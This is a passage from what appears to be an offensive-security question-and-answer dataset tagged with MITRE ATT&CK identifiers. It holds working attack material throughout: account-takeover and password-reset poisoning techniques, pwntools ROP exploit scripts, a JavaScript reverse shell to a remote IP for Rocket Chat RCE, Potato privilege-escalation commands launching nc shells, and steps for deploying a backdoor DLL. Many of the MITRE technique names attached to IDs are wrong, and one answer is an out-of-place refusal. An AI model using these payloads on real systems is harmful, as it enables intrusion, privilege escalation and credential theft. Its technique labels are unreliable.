A: Check if you can figure out when a username has already been registered inside the application. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: TA0009 - Collection.

## Q: How can you attempt to perform a registration takeover by exploiting weak password policies?
A: When creating a user, check the password policy to see if you can use weak passwords. If so, you may try to brute-force credentials. MITRE References: MITRE ID is T1101, MITRE Name is: Password Policy Abuse, and MITRE Tactics are: TA0003 - Persistence.

## Q: How can you attempt to perform a registration takeover by exploiting SQL injection vulnerabilities in registration forms?
A: Check the provided link to learn how to attempt account takeovers or extract information via SQL Injections in registry forms. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007 - Discovery, TA0008 - Lateral Movement.

## Q: How can you attempt to perform a registration takeover by exploiting OAuth vulnerabilities?
A: Check the provided link to learn about OAuth to Account takeover techniques. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a registration takeover by exploiting SAML vulnerabilities?
A: Check the provided link to learn about SAML Attacks. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a registration takeover by changing the email associated with an account?
A: When registered, try to change the email and check if this change is correctly validated or can change it to arbitrary emails. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0003 - Persistence.

## Q: What other techniques can be used to attempt a registration takeover?
A: Check if you can use disposable emails, use a long password (>200) which may lead to DoS, check rate limits on account creation, and use username@burp_collab.net and analyze the callback. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you attempt to perform a password reset takeover by leaking the password reset token via the Referer header?
A: 1. Request password reset to your email address
2. Click on the password reset link
3. Don't change password
4. Click any 3rd party websites (e.g., Facebook, Twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking the password reset token. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a password reset takeover by poisoning the password reset request?
A: 1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header: `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the host header like: `https://attacker.com/reset-password.php?token=TOKEN`. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a password reset takeover by exploiting email parameter manipulation?
A: Try techniques like parameter pollution (email=victim@mail.com&email=hacker@mail.com), using an array of emails ("email":["victim@mail.com","hacker@mail.com"]}), carbon copy (email=victim@mail.com%0A%0Dcc:hacker@mail.com), or using separators (email=victim@mail.com,hacker@mail.com, email=victim@mail.com%20hacker@mail.com, email=victim@mail.com|hacker@mail.com). MITRE References: MITRE ID is T1480, MITRE Name is: Domain Fronting, and MITRE Tactics are: TA0001 - Initial Access.

## Q: How can you attempt to perform a password reset takeover by exploiting weak password reset token generation?
A: The password reset token should be randomly generated and unique every time. Try to determine if the token expires or if it's always the same. The algorithm might be using weak variables like timestamp, user ID, email, name, date of birth, or a small token sequence. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a password reset takeover by leaking the password reset token?
A: 1. Trigger a password reset request using the API/UI for a specific email, e.g., test@mail.com.
2. Inspect the server response and check for a `resetToken`.
3. Then use the token in a URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`. MITRE References: MITRE ID is T1528, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform a password reset takeover by exploiting username collision vulnerabilities?
A: 1. Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username, e.g., `"admin "`.
2. Request a password reset with your malicious username.
3. Use the token sent to your email and reset the victim's password.
4. Connect to the victim's account with the new password. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform an account takeover via HTTP Request Smuggling vulnerabilities?
A: 1. Use **smuggler** to detect the type of HTTP Request Smuggling (CL, TE, CL.TE).
2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data: `GET http://something.burpcollaborator.net HTTP/1.1 X:`.
3. The goal is to open redirect the victims to burpcollab and steal their cookies. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: TA0006 - Credential Access.

## Q: How can you attempt to perform an account takeover via CSRF (Cross-Site Request Forgery) vulnerabilities?
A: 1. Create a payload for the CSRF, e.g., an HTML form with auto submit for a password change.
2. Send the payload. MITRE References: MITRE ID is T1587, MITRE Name is: Develop Capabilities, and MITRE Tactics are: TA0001 - Initial Access.

## Q: How can ReDoS be used to exfiltrate sensitive information?
A: In a CTF (or bug bounty) if you control the Regex that a sensitive information (the flag) is matched with, you can make the page freeze (timeout or longer processing time) if the Regex matched and not if it didn't. This way you will be able to exfiltrate the string char by char. Examples of such ReDoS rules include:

- `^(?=<flag>)((.*)*)*salt$`
- `<flag>(((((((.*)*)*)*)*)*)*)!`
- `^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$` MITRE References: MITRE ID is T1537, MITRE Name is: Transfer Data to Cloud Account, and MITRE Tactics are: Exfiltration.

## Q: How can you trigger the execution of the `release_agent` to execute a payload on the host system?
A: The guessed PID path is written to the `cgroups release_agent` file. This action triggers the execution of the `release_agent`. The success of this step is confirmed by checking for the creation of an output file. MITRE References: MITRE ID is T1569, MITRE Name is: System Services, and MITRE Tactics are: TA0003, TA0004, TA0005.

## Q: How can attackers change the email and password of any user through API parameter manipulation?
A: Attackers can modify email and password parameters in API requests to change account credentials. To mitigate, ensure strict parameter validation and authentication checks, and implement robust logging and monitoring to detect and respond to suspicious activities. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0004, TA0009.

## Q: How can response manipulation be used to bypass error messages or restrictions?
A: Attackers can manipulate HTTP responses to replace bad responses with good ones, bypassing error messages or restrictions. To mitigate, implement server-side checks to ensure response integrity and use secure communication channels like HTTPS to prevent man-in-the-middle attacks. MITRE References: MITRE ID is T1199, MITRE Name is: Trusted Relationship, and MITRE Tactics are: TA0001, TA0006.

## Q: What are the key steps to exploit resource-based constrained delegation?
A: 1. Compromise an account with a service principal name (SPN) or create a new one.
2. Abuse write privileges over the target computer to configure resource-based constrained delegation, allowing the attacker's service account to impersonate any user.
3. Use Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from the attacker's service account to the target computer, impersonating a privileged user. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006.

## Q: How can the responder tool be used to perform LLMNR and NBT-NS poisoning attacks?
A: Responder 3.1.4.0 can be used to perform LLMNR and NBT-NS poisoning attacks by running the following command:

```
responder -I eth0 -w -d
```

This will enable the WPAD rogue proxy server and answer DHCP broadcast requests, allowing the tool to intercept and respond to LLMNR and NBT-NS queries on the specified interface. The -w option starts the WPAD rogue proxy server, while the -d option enables DHCP response answers. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Credential Access, Discovery.

## Q: How can the responder-MultiRelay tool be used to perform relay attacks against Windows systems?
A: The responder-MultiRelay tool can be used to perform relay attacks against Windows systems. However, before using the tool, you need to install the required dependencies by running the following commands:

```
apt-get install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
```

Additionally, you can add custom Mimikatz executables (mimikatz.exe and mimikatz_x86.exe) to the MultiRelay/bin/ folder for the mimi32/mimi command. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: Credential Access, Privilege Escalation.

## Q: How can the responder-Icmp-Redirect tool be used to perform traffic redirection attacks?
A: The responder-Icmp-Redirect tool can be used to perform traffic redirection attacks by running the following command:

```
responder-Icmp-Redirect -I eth0 -i 10.20.30.40 -g 10.20.30.254 -t 10.20.30.48 -r 10.20.40.1
```

This command will redirect the traffic from the target IP address 10.20.30.48 to the IP address 10.20.30.40, while using the original gateway 10.20.30.254 and routing the traffic to the destination 10.20.40.1. This allows the attacker to intercept and monitor the victim's network traffic. MITRE References: MITRE ID is T1557, MITRE Name is: Adversary-in-the-Middle, and MITRE Tactics are: Discovery, Lateral Movement.

## Q: How can you use the `ret2dlresolve` technique to execute arbitrary code?
A: The `ret2dlresolve` technique involves faking the necessary structures that the `_dl_runtime_resolve` function expects on the stack in order to resolve a symbol like `system` and then call it with a configured parameter (e.g. `system('/bin/sh')`). This is done by creating an initial ROP chain that calls `read` to write the fake structures and the string `'/bin/sh'` to a writable memory location, and then the ROP chain continues by calling `_dl_runtime_resolve` to resolve and call the `system` function. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you bypass ASLR in 32-bit systems using a Ret2Libc attack?
A: On 32-bit systems, you can try to brute-force the base address of libc to bypass ASLR in a Ret2Libc attack:

```pythonfor off in range(0xb7000000, 0xb8000000, 0x1000):    # Construct the payload and check if it works```Alternatively, you can try to brute-force the address of the `usleep` function in libc by passing it as an argument and checking if the server takes longer to respond, indicating you found the correct address. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use 'Ret-into-printf' (or 'puts') to leak information from a process?
A: The 'Ret-into-printf' (or 'puts') technique allows you to leak information from a process by calling `printf` or `puts` with specific data placed as an argument. For example, by putting the address of `puts` in the GOT (Global Offset Table) into an execution of `puts`, you can leak the address of `puts` in memory, which can be useful for further exploitation. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: How can you disable ASLR on Linux to make exploitation easier?
A: To disable ASLR on Linux, you can run the following command:

```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
This will disable address space layout randomization (ASLR), making exploitation easier by having predictable addresses. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use printf leaks to bypass ASLR and PIE protection on ARM64 systems?
A: To bypass ASLR and PIE protection using printf leaks on ARM64 systems:

1. Leak the PIE base address by using the `%21$p` format specifier.
2. Leak the libc base address by using the `%25$p` format specifier.
3. Use ROP to call `system()` with the address of `/bin/sh` as the argument.

The key gadgets needed are:

```0x0000000000049c40: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;```
This gadget can be used to load the `/bin/sh` address into `x0` before calling `system()`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How do you set up the exploit using the found gadgets?
A: With the previous gadgets we can control all the needed registers from the stack and use x5 to jump to the second gadget to call the syscall.

Note that knowing this info from the libc library also allows to do a ret2libc attack, but lets use it for this current example.

```pythonfrom pwn import *p = process('./ret2syscall')elf = context.binary = ELF('./ret2syscall') libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")libc.address = 0x0000fffff7df0000 # ASLR disabledbinsh = next(libc.search(b"/bin/sh")) stack_offset = 72#0x0000000000114c2c : bl #0x133070 ; ldp x3, x0, [sp, #8] ; ldp x1, x4, [sp, #0x18] ; ldr x5, [sp, #0x58] ; ldr x2, [sp, #0xe0] ; blr x5load_x0_x1_x2 = libc.address + 0x114c30 # ldp x3, x0, [sp, #8] ; ldp x1, x4, [sp, #0x18] ; ldr x5, [sp, #0x58] ; ldr x2, [sp, #0xe0] ; blr x5# 0x00000000000bb97c : nop ; nop ; mov x8, #0xdd ; svc #0call_execve = libc.address + 0xbb97cprint("/bin/sh in: " + hex(binsh))print("load_x0_x1_x2 in: " + hex(load_x0_x1_x2))print("call_execve in: " + hex(call_execve))# stack offsetbof = b"A" * (stack_offset)bof += p64(load_x0_x1_x2)# ldp x3, x0, [sp, #8]rop = b"BBBBBBBBBBBBBBBB" #x3rop += p64(binsh) #x0# ldp x1, x4, [sp, #0x18] rop += b"C"*(0x18 - len(rop))rop += p64(0x00) # x1rop += b"CCCCCCCC" #x4# ldr x5, [sp, #0x58]rop += b"D"*(0x58 - len(rop)) rop += p64(call_execve) # x5# ldr x2, [sp, #0xe0]rop += b"E" * (0xe0 - len(rop))rop += p64(0x00) # x2payload = bof + ropp.sendline(payload)p.interactive()``` MITRE References: MITRE ID is T1562.001, MITRE Name is: Impair Defenses: Disable or Modify System Firewall, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass ASLR using the vDSO on Linux?
A: If the kernel is compiled with `CONFIG_COMPAT_VDSO`, the vDSO address won't be randomized, allowing you to bypass ASLR:

```
vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
``` MITRE References: MITRE ID is T1055.003, MITRE Name is: Process Injection: Reflective Code Loading, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you compile the binary without PIE and canary protection?
A: Compile the binary without pie and canary:

```
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
``` MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit the binary without PIE using an off-by-2 technique?
A: Actually this is going to by more like a off-by-2 in the stored PC in the stack. Instead of overwriting all the return address we are going to overwrite **only the last 2 bytes** with `0x06c4`.

```pythonfrom pwn import *# Configurationbinary_name = './ret2win'p = process(binary_name)# Prepare the payloadoffset = 72ret2win_addr = p16(0x06c4)payload = b'A' * offset + ret2win_addr# Send the payloadp.send(payload)# Check responseprint(p.recvline())p.close()``` MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit the binary with PIE using an off-by-2 technique?
A: Compile the binary **without the** `**-no-pie**` **argument**

### Off-by-2

Without a leak we don't know the exact address of the winning function but we can know the offset of the function from the binary and knowing that the return address we are overwriting is already pointing to a close address, it's possible to leak the offset to the win function (**0x7d4**) in this case and just use that offset:

```pythonfrom pwn import *# Configurationbinary_name = './ret2win'p = process(binary_name)# Prepare the payloadoffset = 72ret2win_addr = p16(0x07d4)payload = b'A' * offset + ret2win_addr# Send the payloadp.send(payload)# Check responseprint(p.recvline())p.close()``` MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How could an attacker use rev-proxy-grapher to plan a lateral movement strategy through a reverse proxy infrastructure?
A: An attacker could use the rev-proxy-grapher tool (version 0~git20180301-0kali1) to generate a detailed map of a reverse proxy architecture. By analyzing the generated graph, they could identify potential pivot points, vulnerable systems, and paths for lateral movement. For example, they could use `rev-proxy-grapher --topology TOPOLOGY.yaml --nmap-xml NMAP_SCAN.xml --out graph.png` to create a visual representation, then examine it to find exposed internal services, single points of failure, or systems with shared credentials that could be leveraged for further access. This information could help the attacker devise a stealthy lateral movement strategy through the complex proxy infrastructure. MITRE References: MITRE ID is T1570, MITRE Name is: Lateral Movement, and MITRE Tactics are: Lateral Movement.

## Q: What tools can be used to reverse engineer Delphi binaries?
A: For Delphi compiled binaries, you can use the IDR tool (https://github.com/crypto2011/IDR) or the IDA plugin https://github.com/Coldzer0/IDA-For-Delphi. The IDA plugin will execute the binary and resolve function names dynamically at the start of the debugging, allowing you to set breakpoints and debug the application. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can ridenum be used to enumerate user accounts on a remote system?
A: The ridenum tool can be used to enumerate user accounts on a remote system by cycling through RID (Relative Identifier) values and extracting user account information. To do this, run the following command:

```console
root@kali:~# ridenum 192.168.1.236 500 50000 /tmp/passes.txt
[*] Attempting lsaquery first...This will enumerate the base domain SID
[*] Successfully enumerated base domain SID.. Moving on to extract via RID
[*] Enumerating user accounts.. This could take a little while.
```

This command will connect to the remote system at `192.168.1.236`, cycle through RID values from 500 to 50000, and use the password file located at `/tmp/passes.txt` to attempt to brute-force the discovered user accounts. The tool will first attempt to enumerate the base domain SID, then use that information to extract user account details. MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: Discovery.

## Q: How can ridenum be used to brute-force user accounts on a remote system?
A: In addition to enumerating user accounts, ridenum can also be used to brute-force user accounts on a remote system. To do this, you can provide a password file to the tool along with the target IP address and RID range:```consoleroot@kali:~# ridenum 192.168.1.236 500 50000 /tmp/passes.txt[*] Attempting lsaquery first...This will enumerate the base domain SID[*] Successfully enumerated base domain SID.. Moving on to extract via RID[*] Enumerating user accounts.. This could take a little while.[*] Brute forcing user accounts with password file: /tmp/passes.txt```The tool will first enumerate the user accounts by cycling through the RID range, then it will attempt to brute-force the discovered accounts using the provided password file. This can be a useful technique for gaining unauthorized access to user accounts on a remote system. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can getpass be used to extract passwords from result files in Kali Linux?
A: getpass version 1.10 can be used to extract passwords from result files in Kali Linux. To use getpass, run the following command:

```    getpass [options] input_file    ```        The available options for getpass include:        - `-c [colspec]`: Set extraction to N-, N-M, or -M like cut    - `-d [val]`: Set delimiter to character, decimal value, or 0x-style hex value    - `-f [field]`: Set extraction to field number (starts at 1)    - `-n`: Disable extension exclusion entirely (equivalent to -x /dev/null)    - `-t`: Disable extension expansion (file.txt -> file.txt.[hashtype], etc.)    - `-x [file]`: Read excluded extension list from file, replacing default    - `-S exp`: Sets $HEX[] conversion for char or range    - `-U exp`: Resets $HEX[] conversion for char or range        The default excluded extensions are: `.txt .orig .test .csalt.txt .fixme .new`        getpass is a useful tool for quickly extracting passwords from various result files, especially when dealing with large datasets. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can an admin user in Rocket Chat get RCE (Remote Code Execution)?
A: If you are admin inside Rocket Chat you can get RCE. Go to **Integrations** and select **New Integration** and choose any: **Incoming WebHook** or **Outgoing WebHook**. According to the [docs](https://docs.rocket.chat/guides/administration/admin-panel/integrations), both use ES2015 / ECMAScript 6 (basically JavaScript) to process the data. So you can get a [rev shell for javascript](/generic-methodologies-and-resources/shells/linux#nodejs) like:

```
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec("bash -c 'bash -i >& /dev/tcp/10.10.14.4/9001 0>&1'")
```
Configure the WebHook (the channel and post as username must exists), configure the WebHook script, save the changes, get the generated WebHook URL, and call it with curl to receive the rev shell. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can RoguePotato be used for privilege escalation?
A: To use RoguePotato for privilege escalation, run the following command:

```
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
This will leverage the SeImpersonatePrivilege to gain NT AUTHORITY\SYSTEM access. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: PrivilegeEscalation, Defense Evasion.

## Q: How can SharpEfsPotato be used for privilege escalation?
A: To use SharpEfsPotato for privilege escalation, run the following command:

```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
```
This will leverage the SeImpersonatePrivilege to gain NT AUTHORITY\SYSTEM access. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: PrivilegeEscalation, Defense Evasion.

## Q: How can GodPotato be used for privilege escalation?
A: To use GodPotato for privilege escalation, run the following commands:

```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
This will leverage the SeImpersonatePrivilege to gain NT AUTHORITY\SYSTEM access. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: PrivilegeEscalation, Defense Evasion.

## Q: How can you leak the libc address using the `puts` or `printf` function?
A: To leak the libc address using the `puts` or `printf` function, you can follow these steps:

1. Determine the address of the `puts` or `printf` function in the PLT (Procedure Linkage Table):
```pythontry:    libc_func = "puts"    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols["puts"] # This is also valid to call putsexcept:    libc_func = "printf"    PUTS_PLT = ELF_LOADED.plt['printf']```

2. Find the `pop rdi; ret` gadget and the `ret` gadget using ROP:
```pythonPOP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]RET = (ROP_LOADED.find_gadget(['ret']))[0]```

3. Create a ROP chain to leak the address of the `libc_func` function:
```pythonFUNC_GOT = ELF_LOADED.got[libc_func]
rop1 = p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
rop1 = generate_payload_aligned(rop1)
P.sendline(rop1)```

4. Parse the leaked address to obtain the libc base address:
```pythonleak = u64(recieved.ljust(8, b"\x00"))
if LIBC:
    LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
else:
    print("TO CONTINUE) Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")``` MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: TA0007.

## Q: How can you create a ROP chain to execute a shell using the libc `system()` function and the `/bin/sh` string?
A: To create a ROP chain to execute a shell using the libc `system()` function and the `/bin/sh` string, follow these steps:1. Find the address of the `/bin/sh` string in the libc library:```pythonBINSH = next(LIBC.search(b"/bin/sh"))```2. Find the addresses of the `system()` and `exit()` functions in the libc library:```pythonSYSTEM = LIBC.sym["system"]EXIT = LIBC.sym["exit"]```3. Create the ROP chain:```pythonrop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)rop2 = generate_payload_aligned(rop2)```4. Send the ROP chain to the application:```pythonP.sendline(rop2)P.interactive() # Interact with the shell``` MITRE References: MITRE ID is T1203, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: TA0002.

## Q: How can rtpflood (version 1.0-1kali2) be used to perform RTP flooding attacks?
A: rtpflood is a command-line tool that can be used to flood any device processing RTP (Real-time Transport Protocol) traffic. To use rtpflood, run the following command:

```console
root@kali:~# rtpflood 192.168.1.202 192.168.1.1 5060 5061 1000 3 123456789 kali

Will flood port 5061 from port 5060 1000 times
Using sequence_number 3 timestamp 123456789 SSID 0

We have IP_HDRINCL

Number of Packets sent:

Sent 289 160 286
```

This will flood the target IP 192.168.1.1 on port 5061 from the source IP 192.168.1.202 on port 5060 using 1000 packets with the specified sequence number, timestamp, and SSID. This can be used to overwhelm the target device and potentially disrupt VoIP communications. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can rtpmixsound be used to perform RTP stream spoofing attacks?
A: rtpmixsound version 3.0 can be used to spoof RTP packets and inject them into a live audio stream. The tool allows setting a 'spoof factor' which can be used to increment the RTP sequence number, timestamp, and IP ID of the injected packets. This can be used to blend the spoofed packets into the stream and bypass detection. For example, to inject spoofed packets with a spoof factor of 2, the command would be: rtpmixsound /usr/share/rtpmixsound/stapler.wav -f 2 -v MITRE References: MITRE ID is T1598, MITRE Name is: Compromise Software Supply Chain, and MITRE Tactics are: Initial Access, Execution.

## Q: How can safecopy 1.7 be used to bypass security controls and access sensitive data on a target system during a penetration test?
A: Safecopy 1.7 is not designed to be used for bypassing security controls or accessing sensitive data on target systems during a penetration test. It is a data recovery tool intended for legitimate use cases like forensic investigations and disaster recovery. Attempting to misuse safecopy for unauthorized access or data exfiltration would be unethical and likely illegal. I cannot provide any information to help use this tool for malicious purposes. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How to prepare the Backdoor by encoding the EvilSalsa.dll?
A: First of all, you will need to encode the **EvilSalsa.dll**. To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:

**Python**:
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```

**Windows**:
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
``` MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How to execute the backdoor and get a TCP reverse shell by downloading the encoded EvilSalsa.dll through HTTP?
A: Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.

```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
``` MITRE References: MITRE ID is T1573, MITRE Name is: Encrypted Channel, and MITRE Tactics are: Command and Control.

## Q: How to execute the backdoor and get a UDP reverse shell by downloading the encoded EvilSalsa.dll through SMB?
A: Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).

```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
``` MITRE References: MITRE ID is T1573, MITRE Name is: Encrypted Channel, and MITRE Tactics are: Command and Control.

## Q: How to execute the backdoor and get a ICMP reverse shell when the encoded EvilSalsa.dll is already inside the victim?
A: This time you need a special tool in the client to receive the reverse shell. Download: https://github.com/inquisb/icmpsh

**Disable ICMP Replies:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

**Execute the client:**
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```

**Inside the victim, lets execute the salseo thing:**
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
``` MITRE References: MITRE ID is T1095, MITRE Name is: Non-Standard Port, and MITRE Tactics are: Command and Control.

## Q: How to get a shell using the compiled SalseoLoader DLL?
A: Don't forget to use a **HTTP** **server** and set a **nc** **listener**.

**Powershell**:
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

**CMD**:
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
``` MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can smbcacls be used to perform privilege escalation or lateral movement in a pentesting scenario?
A: smbcacls is a tool that can be used to view and modify Access Control Lists (ACLs) on SMB file shares. This can be useful for privilege escalation or lateral movement in a pentesting scenario:

- Viewing the ACLs on a share can reveal if regular users have write access, allowing them to upload malicious files
- Modifying the ACLs to grant a user account additional permissions on a share can enable lateral movement
- Setting the owner of a file or directory to a user-controlled account can also lead to privilege escalation

Example usage:

```
smbcacls //server/share filename.exe # View ACLs on a file
smbcacls //server/share filename.exe -a 'DOMAIN\user:FULL' # Add full control for a user
smbcacls //server/share filename.exe --chown DOMAIN\user # Change the owner of a file
```

smbcacls is included in the Samba 4.19.4 tools. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How can winbind be used to perform credential theft or relay attacks in a pentesting scenario?
A: winbind is a daemon that integrates authentication and directory services from a Windows domain on a Linux system. It can be abused in a pentesting scenario to perform credential theft or relay attacks:

- The 'ntlm_auth' tool can be used to authenticate with NTLM credentials and retrieve session keys
- The 'wbinfo' tool can be used to enumerate domain users and groups, and to change user passwords
- Winbind's integration with PAM can be abused to relay NTLM authentication to other systems

Example usage:```ntlm_auth --username=DOMAIN\user --password=Password123 --request-nt-key # Authenticate and retrieve session keywbinfo -n 'DOMAIN\user' # Resolve a user to a SIDwbinfo --change-user-password=DOMAIN\user # Change a user's password```winbind and associated tools are included in the Samba 4.19.4 package. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets: Kerberoasting, and MITRE Tactics are: Credential Access, Lateral Movement.

## Q: How can samdump2 be used to retrieve password hashes from a Windows system?
